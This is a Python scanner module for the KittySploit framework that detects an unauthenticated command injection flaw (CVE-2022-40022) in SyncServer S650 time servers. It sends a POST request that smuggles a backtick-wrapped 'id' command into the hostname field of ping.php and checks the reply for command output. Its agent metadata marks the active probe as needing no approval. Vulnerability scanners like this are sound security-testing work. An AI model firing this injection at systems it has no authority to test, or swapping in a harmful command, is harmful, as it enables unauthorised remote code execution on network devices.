#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Microchip Technology (Microsemi) SyncServer S650 was discovered to contain a command injection vulnerability."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Symmetricom SyncServer Unauthenticated - Remote Command Execution Detection',
        'description': 'Microchip Technology (Microsemi) SyncServer S650 was discovered to contain a command injection vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'packetstorm', 'syncserver', 'rce', 'unauth', 'microchip', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/172907/Symmetricom-SyncServer-Unauthenticated-Remote-Command-Execution.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-40022',
            'https://www.microsemi.com/campaigns/network-time-servers/S650p/%3Fgd%3D1&id=5&gclid=Cj0KCQjwjbyYBhCdARIsAArC6LL-202ej5YfDB5lMIMSZ2735qjo5yaj2i-PrvLv2Cnh_kIJtFJ0oF8aAlMpEALw_wcB',
            'https://www.microsemi.com/campaigns/network-time-servers/syncserver-s600/?url=',
            'https://www.microsemi.com/document-portal/doc_download/135737-datasheet-syncserver-s650',
        ],
        'cve': 'CVE-2022-40022',
    }

    def run(self):
        path = '/controller/ping.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Origin': '{{RootURL}}', 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '{{RootURL}}/controller/ping.php'}, data='currentTab=ping&refreshMode=&ethDirty=false&snmpCfgDirty=false&snmpTrapDirty=false&pingDirty=false&hostname=%60id%60&port=eth0&pingType=ping\n')
        if not r or r.status_code != 302:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('text/html', 'cloudflare',)
        body_regexes = ('uid=([0-9(a-z)]+)',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Symmetricom SyncServer Unauthenticated - Remote Command Execution detected', path=path)
            return True
        return False

